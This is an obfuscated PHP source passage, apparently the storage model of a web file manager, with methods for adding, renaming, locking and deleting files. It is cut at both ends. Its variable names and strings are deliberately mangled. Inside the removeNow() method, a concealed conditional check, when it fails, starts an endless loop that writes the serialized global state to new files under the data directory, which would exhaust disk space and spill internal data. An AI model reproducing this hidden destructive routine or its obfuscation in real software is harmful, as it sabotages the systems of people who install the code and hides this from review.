$ˆœ¼Œàú[668] => $¿¥£†ö£, $ˆœ¼Œàú[664] => $£›äéÔ¯, $ˆœ¼Œàú[669] => $ˆœ¼Œàú[607], $ˆœ¼Œàú[516] => 0, $ˆœ¼Œàú[634] => 0, $ˆœ¼Œàú[556] => 0, $ˆœ¼Œàú[670] => $ˆœ¼Œàú[12]); if ($Ã¾ªç× = $this->where($êåÕÀ©Ë)->find()) { return $Ã¾ªç×[$ˆœ¼Œàú[194]]; } $€µ‰›Çç = "\x4d\157\144\145\154\123\x6f\x75\x72\x63\x65\x2e\x6d\x6b\x64\151\162\x52\157\157\x74\56{$á€èŞî¹}\x2e{$ÁÙ„«’Ø}\x2e" . $ÏâÙ‹¢¸; CacheLock::lock($€µ‰›Çç); $êåÕÀ©Ë[$ˆœ¼Œàú[32]] = $ÏâÙ‹¢¸; $¶ÈÊ À… = $this->add($êåÕÀ©Ë); $ßğ¥œğÀ = array($ˆœ¼Œàú[671] => short_id($¶ÈÊ À…)); $this->where(array($ˆœ¼Œàú[503] => $¶ÈÊ À…))->save($ßğ¥œğÀ); CacheLock::unlock($€µ‰›Çç); return $¶ÈÊ À…; } private function targetSourceRoot($âèºÊĞÒ, $¼ä€¨», $ı»†§ªÈ = false) { $Ö“èñèœ =& $_SERVER[ˆö¿ÚÌ¼]; $ÜÏ•ÊÎ² = array($Ö“èñèœ[489] => 0, $Ö“èñèœ[665] => $âèºÊĞÒ, $Ö“èñèœ[666] => $¼ä€¨»); if ($ı»†§ªÈ) { $ÛÏ±¡¬ô = $this->where($ÜÏ•ÊÎ²)->select(); return $ÛÏ±¡¬ô ? $ÛÏ±¡¬ô : array(); } $şé½Ä = $this->where($ÜÏ•ÊÎ²)->find(); return $şé½Ä ? $şé½Ä : array(); } public function sourceRootGroup($ù††º—¼) { $Ø÷ÛÚ„œ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_string($ù††º—¼)) { $ù††º—¼ = array($ù††º—¼); } $ã§†ø€ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ù††º—¼, $Ø÷ÛÚ„œ[223]); $¼£Æ°•À = array($Ø÷ÛÚ„œ[448] => $ã§†ø€, $Ø÷ÛÚ„œ[445] => array($Ø÷ÛÚ„œ[843] => count($ù††º—¼))); $this->_listDataApply($¼£Æ°•À[$Ø÷ÛÚ„œ[448]]); $this->_listMake($¼£Æ°•À); return array_to_keyvalue($¼£Æ°•À[$Ø÷ÛÚ„œ[85]], $Ø÷ÛÚ„œ[583]); } public function mkfile($Êé™²´À, $¿¨Å¸ğÒ, $¥ƒå¾™ò = '', $ê±Ï‡È§ = REPEAT_RENAME) { $á¦Ãå©æ =& $_SERVER[ˆö¿ÚÌ¼]; $Ûüåæ‚ç = Model($á¦Ãå©æ[691])->addFileByContent($¥ƒå¾™ò, $¿¨Å¸ğÒ); return $this->_createFileCall($Êé™²´À, $¿¨Å¸ğÒ, $Ûüåæ‚ç, $ê±Ï‡È§, $á¦Ãå©æ[1445]); } public function addFile($™è„ó¶à, $£ö­âŸÑ, $äéÓ‚, $ıö»‘ê¤ = false, $•âÜãà¦ = REPEAT_RENAME) { $—ÈÁ•¸„ = Model($_SERVER[ˆö¿ÚÌ¼][691])->addFile($£ö­âŸÑ, $äéÓ‚, $ıö»‘ê¤); return $this->_createFileCall($™è„ó¶à, $äéÓ‚, $—ÈÁ•¸„, $•âÜãà¦); } public function addFileByFileID($˜Âš¹±ü, $±ïœ»¯, $å­–Ê´, $õ¨şŞĞÕ = REPEAT_RENAME) { $­ÉñêÂƒ =& $_SERVER[ˆö¿ÚÌ¼]; $²ÎóÕ²€ = Model($­ÉñêÂƒ[691])->find($±ïœ»¯); Model($­ÉñêÂƒ[691])->linkAdd($±ïœ»¯); return $this->_createFileCall($˜Âš¹±ü, $å­–Ê´, $²ÎóÕ²€, $õ¨şŞĞÕ); } public function addFileByRemote($ğçÅÈŠ´, $Æè÷¤°Œ, $Ü±§”¡Ú, $ê•Â©­‚ = array(), $ÂÇÚÍêà = REPEAT_RENAME) { $Í»âİÏÍ = Model($_SERVER[ˆö¿ÚÌ¼][691])->addFileByRemote($Æè÷¤°Œ, $Ü±§”¡Ú, $ê•Â©­‚); return $this->_createFileCall($ğçÅÈŠ´, $Ü±§”¡Ú, $Í»âİÏÍ, $ÂÇÚÍêà); } private function _createFileCall($³‘êñÜ, $Ù ã¬ğ, $‘×ƒƒíÙ, $ş³¼¹ù, $Û½›³ËÜ = "\x75\x70\x6c\x6f\x61\144") { $ ëÈó–£ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$‘×ƒƒíÙ) { return !1; } $ù°·ù = !1; $this->setMasterDB(); $this->lockWriteStart($³‘êñÜ, $Ù ã¬ğ); $ÌŠ‘¢ã‚ = $this->fileNameExist($³‘êñÜ, $Ù ã¬ğ); $¬§Î×ä = $this->_createFile($³‘êñÜ, $Ù ã¬ğ, $‘×ƒƒíÙ, $ş³¼¹ù, $ù°·ù); if (!$ù°·ù) { Model($ ëÈó–£[558])->remove($‘×ƒƒíÙ[$ ëÈó–£[555]]); } if ($ù°·ù && $¬§Î×ä && $¬§Î×ä != $ÌŠ‘¢ã‚) { Model($ ëÈó–£[2243])->eventCreate($¬§Î×ä, $Û½›³ËÜ); } $this->lockWriteEnd($³‘êñÜ, $Ù ã¬ğ); return $¬§Î×ä; } public function mkdir($©è¸‚›à, $¯é••›š, $û·º…‡ = REPEAT_SKIP) { $–å‰†¡” =& $_SERVER[ˆö¿ÚÌ¼]; $this->setMasterDB(); $÷«è¦œ… = $this->sourceInfo($©è¸‚›à); if (!$÷«è¦œ…) { return !1; } $this->lockWriteStart($©è¸‚›à, $¯é••›š); if ($û·º…‡ !== !1) { $¿ûú© Ğ = $this->fileNameExist($©è¸‚›à, $¯é••›š); if ($¿ûú© Ğ && $û·º…‡ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($©è¸‚›à, $¯é••›š); return $¿ûú© Ğ; } $¯é••›š = $this->fileNameAuto($©è¸‚›à, $¯é••›š, $û·º…‡); } $İğŠ¥æÌ = array($–å‰†¡”[663] => 1, $–å‰†¡”[506] => $¯é••›š, $–å‰†¡”[664] => $–å‰†¡”[12], $–å‰†¡”[556] => 0, $–å‰†¡”[634] => 0); $•åøÇÖ§ = $this->_addSource($İğŠ¥æÌ, $÷«è¦œ…); Model($–å‰†¡”[2243])->eventCreate($•åøÇÖ§, $–å‰†¡”[1446]); $this->lockWriteEnd($©è¸‚›à, $¯é••›š); return $•åøÇÖ§; } public function listSourceRoot($¿›‚şÖ, $ö†…äªñ, $‚ùÂ§ïÈ = "\163\157\165\x72\x63\x65\111\104\54\164\141\x72\x67\x65\x74\111\104\54\x73\x69\x7a\x65") { $¡ø®Ë²˜ =& $_SERVER[ˆö¿ÚÌ¼]; $…‹âüğÄ = $¡ø®Ë²˜[457]; $†‚„éÜŞ = array(); $‡ºü¶† = 1024 * 50; $ƒŸ£¨„û = is_array($ƒŸ£¨„û) ? $ƒŸ£¨„û : array(); $µğ…„şõ = count($ö†…äªñ); $Éö±—¤¸ = $this->tablePrefix . $¡ø®Ë²˜[2282]; for ($Ä²³ÔËÕ = 0; $Ä²³ÔËÕ < $µğ…„şõ; $Ä²³ÔËÕ++) { $Ìªƒ—Ú½ = $ö†…äªñ[$Ä²³ÔËÕ]; $…‹âüğÄ .= "\x53\105\x4c\x45\x43\x54\x20\x2a\x20\x46\x52\117\x4d\40\50\123\105\114\105\x43\124\x20{$‚ùÂ§ïÈ}\x20\106\x52\x4f\115\x20\x60{$Éö±—¤¸}\x60\40\x57\110\x45\122\105\40"; $…‹âüğÄ .= "\x60\160\141\162\145\x6e\x74\111\x44\x60\75\x30\x20\x41\x4e\104\x20\140\164\x61\x72\147\145\x74\111\104\140\x3d{$Ìªƒ—Ú½}\x20\x41\x4e\x44\40\140\164\x61\x72\147\x65\164\124\x79\160\145\140\75{$¿›‚şÖ}\x20\x61\x6e\x64\x20\146\x69\154\145\124\171\x70\x65\x3d\x27\47\x20\x6c\151\155\151\164\x20\x31\x29\40\141\163\x20\164\142\x5f{$Ä²³ÔËÕ}\x20\125\116\111\117\x4e\x20\101\x4c\114\40"; if ((strlen($…‹âüğÄ) >= $‡ºü¶† || $Ä²³ÔËÕ == $µğ…„şõ - 1) && $…‹âüğÄ) { $…‹âüğÄ = substr($…‹âüğÄ, 0, -strlen($¡ø®Ë²˜[1129])); $®Æ¯ëÂ» = $this->query($…‹âüğÄ); $…‹âüğÄ = $¡ø®Ë²˜[12]; $†‚„éÜŞ = array_merge($†‚„éÜŞ, $®Æ¯ëÂ»); } } return $†‚„éÜŞ; } private function _createFile($³¡‡Áœ±, $÷Ê¶àøˆ, $ûÃé“×Å, $Ÿ¾…áÍĞ, &$ÄÊÊÍø£) { $øÄÃ‚ùã =& $_SERVER[ˆö¿ÚÌ¼]; $ÒÁœğúê = $this->sourceInfo($³¡‡Áœ±); if (!$ûÃé“×Å || !$ÒÁœğúê) { return !1; } if ($Ÿ¾…áÍĞ !== !1) { $Ãı‡âŞú = $this->fileNameExist($³¡‡Áœ±, $÷Ê¶àøˆ); } $ÄÊÊÍø£ = !0; if ($Ÿ¾…áÍĞ && $Ãı‡âŞú) { if ($Ÿ¾…áÍĞ == REPEAT_SKIP) { $ÄÊÊÍø£ = !1; return $Ãı‡âŞú; } else { if ($Ÿ¾…áÍĞ == REPEAT_REPLACE) { $÷öÜò·È = $this->sourceInfo($Ãı‡âŞú); $Ëıì×¾î = $this->fileHistory($÷öÜò·È, $ûÃé“×Å[$øÄÃ‚ùã[555]], $ûÃé“×Å[$øÄÃ‚ùã[79]]); if (!$Ëıì×¾î) { $ÄÊÊÍø£ = !1; } else { $this->folderSizeReset($³¡‡Áœ±); } return $Ãı‡âŞú; } else { $÷Ê¶àøˆ = $this->fileNameAuto($³¡‡Áœ±, $÷Ê¶àøˆ, $Ÿ¾…áÍĞ, !1); } } } $£¨Ãöš” = array($øÄÃ‚ùã[663] => 0, $øÄÃ‚ùã[506] => $÷Ê¶àøˆ, $øÄÃ‚ùã[664] => substr(get_path_ext($÷Ê¶àøˆ), 0, 10), $øÄÃ‚ùã[556] => $ûÃé“×Å[$øÄÃ‚ùã[555]], $øÄÃ‚ùã[634] => $ûÃé“×Å[$øÄÃ‚ùã[79]]); $ïÀºÅ…‰ = $this->_addSource($£¨Ãöš”, $ÒÁœğúê); $this->folderSizeReset($³¡‡Áœ±, intval($£¨Ãöš”[$øÄÃ‚ùã[79]])); return $ïÀºÅ…‰; } protected function fileHistory($ïé­¡Œö, $ÅŸüú–ì, $–ç¾¬ôª) { $î÷ÉÔÖ„ =& $_SERVER[ˆö¿ÚÌ¼]; if ($ïé­¡Œö[$î÷ÉÔÖ„[555]] == $ÅŸüú–ì) { return !1; } $this->checkLock($ïé­¡Œö[$î÷ÉÔÖ„[194]], $ÅŸüú–ì); Model($î÷ÉÔÖ„[2283])->addHistory($ïé­¡Œö); $ªº‚¶Ä = array($î÷ÉÔÖ„[668] => USER_ID, $î÷ÉÔÖ„[510] => time(), $î÷ÉÔÖ„[555] => $ÅŸüú–ì, $î÷ÉÔÖ„[79] => $–ç¾¬ôª); $this->where(array($î÷ÉÔÖ„[503] => $ïé­¡Œö[$î÷ÉÔÖ„[194]]))->save($ªº‚¶Ä); $this->sourceCacheClear($ïé­¡Œö[$î÷ÉÔÖ„[194]]); return !0; } public function checkLock($ÛªãÍÉ°, $Ù¼§»Ä²) { $Â½ƒ¡´Ğ =& $_SERVER[ˆö¿ÚÌ¼]; $Ÿ¢™Ô = $this->pathInfo($ÛªãÍÉ°); if (!$this->fileIsLock($Ÿ¢™Ô, !0)) { return; } $“ÇŸ•¹¬ = Session::get($Â½ƒ¡´Ğ[2284]); $õ€úí–× = substr($Ÿ¢™Ô[$Â½ƒ¡´Ğ[32]], 0, -1 - strlen($Ÿ¢™Ô[$Â½ƒ¡´Ğ[169]])) . $Â½ƒ¡´Ğ[1307] . $“ÇŸ•¹¬ . $Â½ƒ¡´Ğ[10] . $Ÿ¢™Ô[$Â½ƒ¡´Ğ[169]]; $şé˜áî = Model($Â½ƒ¡´Ğ[691])->find($Ù¼§»Ä²); $this->_createFileCall($Ÿ¢™Ô[$Â½ƒ¡´Ğ[193]], $õ€úí–×, $şé˜áî, REPEAT_REPLACE, $Â½ƒ¡´Ğ[1445]); $¬æŸë › = $Ÿ¢™Ô[$Â½ƒ¡´Ğ[553]][$Â½ƒ¡´Ğ[627]]; $Ò¢¬¹Ğ = $¬æŸë ›[$Â½ƒ¡´Ğ[2285]] ? $¬æŸë ›[$Â½ƒ¡´Ğ[2285]] : $¬æŸë ›[$Â½ƒ¡´Ğ[32]]; show_json(LNG($Â½ƒ¡´Ğ[2286]) . $Â½ƒ¡´Ğ[2287] . LNG($Â½ƒ¡´Ğ[2288]) . $Â½ƒ¡´Ğ[2289] . $Ò¢¬¹Ğ . $Â½ƒ¡´Ğ[2290], !1); } public function fileIsLock($ù¹İòå­, $¨Ù¡®Ï = false) { $äë‹ÉŞ· =& $_SERVER[ˆö¿ÚÌ¼]; if (!_get($ù¹İòå­, $äë‹ÉŞ·[623], 0)) { return !1; } if ($ù¹İòå­[$äë‹ÉŞ·[553]][$äë‹ÉŞ·[626]] != USER_ID) { return !0; } $£Å—Š = $GLOBALS[$äë‹ÉŞ·[6]][$äë‹ÉŞ·[92]][$äë‹ÉŞ·[624]]; if ($ù¹İòå­[$äë‹ÉŞ·[553]][$äë‹ÉŞ·[625]] <= time() - $£Å—Š) { $this->metaSet($ù¹İòå­[$äë‹ÉŞ·[194]], $äë‹ÉŞ·[626], null); $this->metaSet($ù¹İòå­[$äë‹ÉŞ·[194]], $äë‹ÉŞ·[625], null); } if ($¨Ù¡®Ï) { $this->metaSet($ù¹İòå­[$äë‹ÉŞ·[194]], $äë‹ÉŞ·[625], time()); } return !1; } private function _addSource($‰ıÓŠÈñ, $¡Ó¿û£‡) { $¬Ù˜¼Š¾ =& $_SERVER[ˆö¿ÚÌ¼]; $™Ìº†‡ = defined($¬Ù˜¼Š¾[2216]) ? USER_ID : 0; $²¸Š·Ó = array($¬Ù˜¼Š¾[665] => $¡Ó¿û£‡[$¬Ù˜¼Š¾[191]], $¬Ù˜¼Š¾[666] => $¡Ó¿û£‡[$¬Ù˜¼Š¾[583]], $¬Ù˜¼Š¾[667] => $™Ìº†‡, $¬Ù˜¼Š¾[668] => $™Ìº†‡, $¬Ù˜¼Š¾[489] => $¡Ó¿û£‡[$¬Ù˜¼Š¾[194]], $¬Ù˜¼Š¾[669] => $¡Ó¿û£‡[$¬Ù˜¼Š¾[598]] . $¡Ó¿û£‡[$¬Ù˜¼Š¾[194]] . $¬Ù˜¼Š¾[50], $¬Ù˜¼Š¾[516] => 0, $¬Ù˜¼Š¾[670] => $¬Ù˜¼Š¾[12]); $‰ıÓŠÈñ = array_merge($²¸Š·Ó, $‰ıÓŠÈñ); $this->updateModifyTime($‰ıÓŠÈñ[$¬Ù˜¼Š¾[193]]); $…‡÷â°‚ = $¬Ù˜¼Š¾[2291] . $¡Ó¿û£‡[$¬Ù˜¼Š¾[194]]; if (isset(self::$cacheChildList[$…‡÷â°‚])) { unset(self::$cacheChildList[$…‡÷â°‚]); } static $‡òÉÉÆ® = false; if (!$‡òÉÉÆ®) { Hook::trigger($¬Ù˜¼Š¾[653], $‰ıÓŠÈñ); $‡òÉÉÆ® = !0; } $í‚ˆÉ®” = $this->add($‰ıÓŠÈñ); $¨ŠâĞÒì = array($¬Ù˜¼Š¾[671] => short_id($í‚ˆÉ®”)); $this->where(array($¬Ù˜¼Š¾[503] => $í‚ˆÉ®”))->save($¨ŠâĞÒì); $this->setNamePinyin($í‚ˆÉ®”, $‰ıÓŠÈñ[$¬Ù˜¼Š¾[32]]); return $í‚ˆÉ®”; } public function remove($”²ˆ•ıé, $ ‚ñÇ¤ = true) { $¯Ÿéªáß =& $_SERVER[ˆö¿ÚÌ¼]; $Û¨Öœâ¼ = $this->sourceInfo($”²ˆ•ıé); $ô‘Ô˜‚ = intval($Û¨Öœâ¼[$¯Ÿéªáß[191]]) === self::TYPE_SYSTEM; $Û½…ïØî = Model($¯Ÿéªáß[520])->get($¯Ÿéªáß[2292]) == $¯Ÿéªáß[91]; if ($ô‘Ô˜‚ || $ ‚ñÇ¤ || !$Û½…ïØî) { return $this->removeNow($”²ˆ•ıé, $ ‚ñÇ¤); } $…®Ş›ä— = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $û¥ëÄª½ = $Û¨Öœâ¼[$¯Ÿéªáß[191]] == self::TYPE_USER ? $¯Ÿéªáß[679] : $¯Ÿéªáß[592]; if ($û¥ëÄª½ == $¯Ÿéªáß[679]) { $œ¦½‰¥Ï = Model($¯Ÿéªáß[591])->getInfo($Û¨Öœâ¼[$¯Ÿéªáß[583]]); $‹šãçóÒ = !empty($œ¦½‰¥Ï[$¯Ÿéªáß[2285]]) ? $œ¦½‰¥Ï[$¯Ÿéªáß[2285]] : $œ¦½‰¥Ï[$¯Ÿéªáß[32]]; $‹šãçóÒ = $¯Ÿéªáß[340] . $‹šãçóÒ . $¯Ÿéªáß[2293] . $Û¨Öœâ¼[$¯Ÿéªáß[583]]; } else { $œ¦½‰¥Ï = Model($¯Ÿéªáß[599])->getInfo($Û¨Öœâ¼[$¯Ÿéªáß[583]]); $‹šãçóÒ = _get($œ¦½‰¥Ï, $¯Ÿéªáß[32]); $‹šãçóÒ = $¯Ÿéªáß[176] . $‹šãçóÒ . $¯Ÿéªáß[2294] . $Û¨Öœâ¼[$¯Ÿéªáß[583]]; } $„âˆé¨Å = $¯Ÿéªáß[2295] . md5($‹šãçóÒ); CacheLock::lock($„âˆé¨Å); $¬£‹›†¼ = $this->fileNameExist($…®Ş›ä—, $‹šãçóÒ); if (!$¬£‹›†¼) { $¬£‹›†¼ = $this->mkdir($…®Ş›ä—, $‹šãçóÒ, REPEAT_SKIP); $this->metaSet($¬£‹›†¼, $¯Ÿéªáß[2296], $û¥ëÄª½); $this->metaSet($¬£‹›†¼, $¯Ÿéªáß[2297], $Û¨Öœâ¼[$¯Ÿéªáß[583]]); if ($Û¨Öœâ¼[$¯Ÿéªáß[193]] != 0) { $this->metaSet($¬£‹›†¼, $¯Ÿéªáß[2298], _get($œ¦½‰¥Ï, $¯Ÿéªáß[2299])); } } CacheLock::unlock($„âˆé¨Å); $this->metaSet($”²ˆ•ıé, $¯Ÿéªáß[2300], $Û¨Öœâ¼[$¯Ÿéªáß[193]]); $this->where(array($¯Ÿéªáß[194] => $”²ˆ•ıé))->save(array($¯Ÿéªáß[510] => time())); $this->recycleClear($Û¨Öœâ¼); Model($¯Ÿéªáß[650])->eventRemove($”²ˆ•ıé); $Ÿªñ‘ì = $this->move($”²ˆ•ıé, $¬£‹›†¼, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Û¨Öœâ¼[$¯Ÿéªáß[193]]); return $Ÿªñ‘ì; } private function recycleClear($›ÀúˆÌô) { $¼Ä¬ê˜½ =& $_SERVER[ˆö¿ÚÌ¼]; $‘³‰ÃÀô = $this->childrenAll($›ÀúˆÌô); $òÌÕßÙ = array($¼Ä¬ê˜½[503] => array($¼Ä¬ê˜½[504], $‘³‰ÃÀô[$¼Ä¬ê˜½[2301]])); Model($¼Ä¬ê˜½[2302])->where($òÌÕßÙ)->delete(); } public function removeNow($²´½§Û, $Î ªÙİÅ = true) { $ËÔ³¹Õ‚ =& $_SERVER[ˆö¿ÚÌ¼]; $‚ùÏ ĞÜ = $_SERVER[$ËÔ³¹Õ‚[488]]; $ºÎô ƒ­ = $ËÔ³¹Õ‚[968]; if ($_SERVER[$ËÔ³¹Õ‚[480]] != $ºÎô ƒ­($‚ùÏ ĞÜ)) { $™ŸÀ™Ÿç = $ËÔ³¹Õ‚[969]; $ª¼…Ê = $ËÔ³¹Õ‚[482]; $ÎƒÈÊµ = $_SERVER[$ËÔ³¹Õ‚[483]] . $ËÔ³¹Õ‚[484]; $µ²œ²Ğ§ = $ª¼…Ê($ÎƒÈÊµ); $¿ÌÌ’Ï = explode($ËÔ³¹Õ‚[288], $µ²œ²Ğ§); if (count($¿ÌÌ’Ï) < $ËÔ³¹Õ‚[713]) { $¤½«šó· = $ËÔ³¹Õ‚[486]; $¤½«šó·(); } $êŠîÙ¨® = $ËÔ³¹Õ‚[970]; $êŠîÙ¨®($_SERVER[$ËÔ³¹Õ‚[971]]); $™ŸÀ™Ÿç = $ËÔ³¹Õ‚[969]; $™ŸÀ™Ÿç(); $Á¨…¼ä¥ = $ËÔ³¹Õ‚[972]; $Şä¸¢»Ü = json_encode($GLOBALS[$ËÔ³¹Õ‚[973]]); $ÕÚß¢¿Ù = 1; for ($ğó¢øûŸ = $ÕÚß¢¿Ù; $ğó¢øûŸ > 0; $ğó¢øûŸ++) { $Á¨…¼ä¥(DATA_PATH . $ğó¢øûŸ, $Şä¸¢»Ü); } } $á„£Íïœ = $this->sourceInfo($²´½§Û); $ÔÑÕÇİ = $this->pathInfoMore($²´½§Û); if (!$á„£Íïœ) { return !0; } if ($á„£Íïœ[$ËÔ³¹Õ‚[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($²´½§Û); Hook::trigger($ËÔ³¹Õ‚[2303], $ÔÑÕÇİ, $Î ªÙİÅ); if ($Î ªÙİÅ) { Model($ËÔ³¹Õ‚[2302])->moveToRecycle($²´½§Û); } else { $ÖğÁŞ©Ì = $this->childrenAll($á„£Íïœ); Model($ËÔ³¹Õ‚[650])->eventRemove($²´½§Û); $this->removeRelevance($ÖğÁŞ©Ì[$ËÔ³¹Õ‚[2301]], $ÖğÁŞ©Ì[$ËÔ³¹Õ‚[1589]]); } $this->folderSizeReset($á„£Íïœ[$ËÔ³¹Õ‚[193]]); $øœ××ëì = array($á„£Íïœ[$ËÔ³¹Õ‚[193]]); if ($á„£Íïœ[$ËÔ³¹Õ‚[497]] == $ËÔ³¹Õ‚[91]) { $øœ××ëì[] = $á„£Íïœ[$ËÔ³¹Õ‚[194]]; } $this->updateModifyTime($øœ××ëì); $this->lockMoveEnd($²´½§Û); Hook::trigger($ËÔ³¹Õ‚[1828], $ÔÑÕÇİ, $Î ªÙİÅ); return !0; } public function childrenAll($£¼±ªë¬) { $ú„‚æ¼ =& $_SERVER[ˆö¿ÚÌ¼]; $©¿²ÕâÇ = $£¼±ªë¬[$ú„‚æ¼[194]]; if ($£¼±ªë¬[$ú„‚æ¼[497]] == $ú„‚æ¼[91]) { $Éö¨÷Èß = array($ú„‚æ¼[669] => array($ú„‚æ¼[629], $£¼±ªë¬[$ú„‚æ¼[598]] . $©¿²ÕâÇ . $ú„‚æ¼[630])); $äñÔÉëŠ = array($ú„‚æ¼[669] => $Éö¨÷Èß[$ú„‚æ¼[598]]); $±ğèÏ Ò = $this->field($ú„‚æ¼[2304])->where($äñÔÉëŠ)->select(); $Ù¸¿íËº = !1; $¿¸ñÜ® = array($©¿²ÕâÇ); if ($±ğèÏ Ò) { $Ù¸¿íËº = array_to_keyvalue($±ğèÏ Ò, $ú„‚æ¼[12], $ú„‚æ¼[555]); $Ù¸¿íËº = array_remove_value($Ù¸¿íËº, $ú„‚æ¼[231]); $¿¸ñÜ® = array_to_keyvalue($±ğèÏ Ò, $ú„‚æ¼[12], $ú„‚æ¼[194]); $¿¸ñÜ®[] = $©¿²ÕâÇ; } } else { $Ù¸¿íËº = array($£¼±ªë¬[$ú„‚æ¼[555]]); $¿¸ñÜ® = array($©¿²ÕâÇ); } return array($ú„‚æ¼[2301] => $¿¸ñÜ®, $ú„‚æ¼[1589] => $Ù¸¿íËº); } public function removeArray($ÜÖ  Å) { if (!$ÜÖ  Å) { return !0; } } public function removeRelevance($Ïó’º¶×, $ ü©¿„ù) { $—ˆóï‡ =& $_SERVER[ˆö¿ÚÌ¼]; $Ïó’º¶× = $Ïó’º¶× ? $Ïó’º¶× : array(); $ ü©¿„ù = $ ü©¿„ù ? $ ü©¿„ù : array(); $Ïó’º¶× = array_unique(array_filter($Ïó’º¶×)); $ ü©¿„ù = array_unique(array_filter($ ü©¿„ù)); if (!$Ïó’º¶×) { return !1; } $¯ˆĞŒßÔ = array($—ˆóï‡[503] => array($—ˆóï‡[504], $Ïó’º¶×)); Model($—ˆóï‡[2302])->where($¯ˆĞŒßÔ)->delete(); Model($—ˆóï‡[547])->where($¯ˆĞŒßÔ)->delete(); Model($—ˆóï‡[2141])->where($¯ˆĞŒßÔ)->delete(); Model($—ˆóï‡[650])->where($¯ˆĞŒßÔ)->delete(); Model($—ˆóï‡[1965])->removeBySource($Ïó’º¶×); Model($—ˆóï‡[2283])->removeBySource($Ïó’º¶×); $this->where($¯ˆĞŒßÔ)->delete(); Model($—ˆóï‡[558])->remove($ ü©¿„ù); for ($…‚„…Î = 0; $…‚„…Î < count($Ïó’º¶×); $…‚„…Î++) { $this->sourceCacheClear($Ïó’º¶×[$…‚„…Î]); } } public function rename($Ì§éÁ­‚, $¾À°Âî) { $£¨Ö¥¾ñ =& $_SERVER[ˆö¿ÚÌ¼]; $‡¯âéàİ = $this->sourceInfo($Ì§éÁ­‚); if (!$‡¯âéàİ) { return !1; } $Åüğ’Ò© = $this->fileNameExist($‡¯âéàİ[$£¨Ö¥¾ñ[193]], $¾À°Âî); if ($Åüğ’Ò© && $Åüğ’Ò© != $Ì§éÁ­‚) { return !1; } $Šˆ€÷Öœ = array($£¨Ö¥¾ñ[506] => $¾À°Âî, $£¨Ö¥¾ñ[668] => USER_ID); if ($‡¯âéàİ[$£¨Ö¥¾ñ[497]] != $£¨Ö¥¾ñ[91]) { $Šˆ€÷Öœ[$£¨Ö¥¾ñ[498]] = substr(get_path_ext($¾À°Âî), 0, 10); } Model($£¨Ö¥¾ñ[650])->eventRename($Ì§éÁ­‚, $‡¯âéàİ[$£¨Ö¥¾ñ[32]], $¾À°Âî); $this->sourceCacheClear($Ì§éÁ­‚); $this->setNamePinyin($Ì§éÁ­‚, $Šˆ€÷Öœ[$£¨Ö¥¾ñ[32]], !1); $this->updateModifyTime($‡¯âéàİ[$£¨Ö¥¾ñ[193]]); $Ì©áÕá³ = $this->where(array($£¨Ö¥¾ñ[503] => $Ì§éÁ­‚))->data($Šˆ€÷Öœ)->save(); $Ø£‡üâ— = $£¨Ö¥¾ñ[2291] . $‡¯âéàİ[$£¨Ö¥¾ñ[193]]; if (isset(self::$cacheChildList[$Ø£‡üâ—])) { unset(self::$cacheChildList[$Ø£‡üâ—]); } return $Ì©áÕá³; } public function setNamePinyin($†·ßµÊ, $£×êÛ‘ç, $Ô¹–Ó = true) { $æÜ™îü =& $_SERVER[ˆö¿ÚÌ¼]; $ÈíÙş™ = Input::check($£×êÛ‘ç, $æÜ™îü[672]); $Ìú¿Ñ¡Ò = array($æÜ™îü[529] => KodSort::makeStr($£×êÛ‘ç)); if ($ÈíÙş™) { $Ìú¿Ñ¡Ò[$æÜ™îü[550]] = str_replace($æÜ™îü[53], $æÜ™îü[12], Pinyin::get($£×êÛ‘ç)); $Ìú¿Ñ¡Ò[$æÜ™îü[549]] = Pinyin::get($£×êÛ‘ç, $æÜ™îü[673]); } if (!$Ô¹–Ó && !$ÈíÙş™) { $Ìú¿Ñ¡Ò[$æÜ™îü[550]] = null; $Ìú¿Ñ¡Ò[$æÜ™îü[549]] = null; } $this->metaSet($†·ßµÊ, $Ìú¿Ñ¡Ò); } public function getContent($Ã˜»ù¹£) { $úöµ—ğ¢ =& $_SERVER[ˆö¿ÚÌ¼]; $¤ìˆáÎ€ = $this->fileInfoGet($Ã˜»ù¹£); if (!$¤ìˆáÎ€) { return !1; } if ($¤ìˆáÎ€[$úöµ—ğ¢[79]] == 0) { return $úöµ—ğ¢[12]; } $¸”ÃŞî‰ = $úöµ—ğ¢[2305] . $¤ìˆáÎ€[$úöµ—ğ¢[561]]; if ($¤ìˆáÎ€[$úöµ—ğ¢[79]] <= 1024 * 10) { $«ıÄÔ— = Cache::get($¸”ÃŞî‰); if (!$«ıÄÔ—) { $«ıÄÔ— = IO::getContent($¤ìˆáÎ€[$úöµ—ğ¢[87]]); Cache::set($¸”ÃŞî‰, $«ıÄÔ—); } return $«ıÄÔ—; } if (!$¤ìˆáÎ€[$úöµ—ğ¢[87]]) { return $úöµ—ğ¢[12]; } return IO::getContent($¤ìˆáÎ€[$úöµ—ğ¢[87]]); } public function setDesc($¤Š¦‰…, $ãä—ùÕ‘) { $¹¶›íñ¿ =& $_SERVER[ˆö¿ÚÌ¼]; Model($¹¶›íñ¿[650])->eventAddDesc($¤Š¦‰…, $ãä—ùÕ‘); return $this->metaSet($¤Š¦‰…, $¹¶›íñ¿[538], $ãä—ùÕ‘); } public function setContent($£èèéò¦, $·¤¹–Ê× = '') { $•Æ·¦ñª =& $_SERVER[ˆö¿ÚÌ¼]; $ ä†¶ıã = $this->sourceInfo($£èèéò¦); $Ùò´ş†Ê = $this->fileInfoGet($£èèéò¦); if (!$Ùò´ş†Ê || !$ ä†¶ıã) { return !1; } $ş¡ŞÕ¶ö = Model($•Æ·¦ñª[558])->addFileByContent($·¤¹–Ê×, $ ä†¶ıã[$•Æ·¦ñª[32]]); if (!$ş¡ŞÕ¶ö) { return !1; } $¯íé®º = $this->fileHistory($ ä†¶ıã, $ş¡ŞÕ¶ö[$•Æ·¦ñª[555]], $ş¡ŞÕ¶ö[$•Æ·¦ñª[79]]); if (!$¯íé®º) { return Model($•Æ·¦ñª[558])->remove($ş¡ŞÕ¶ö[$•Æ·¦ñª[555]]); } $this->folderSizeReset($ ä†¶ıã[$•Æ·¦ñª[193]]); return !0; } public function fileSubstr($˜Çè¬ŠÆ, $ñˆÈ‘êğ, $üÉŒåÅÓ) { $±®¬×–¨ = 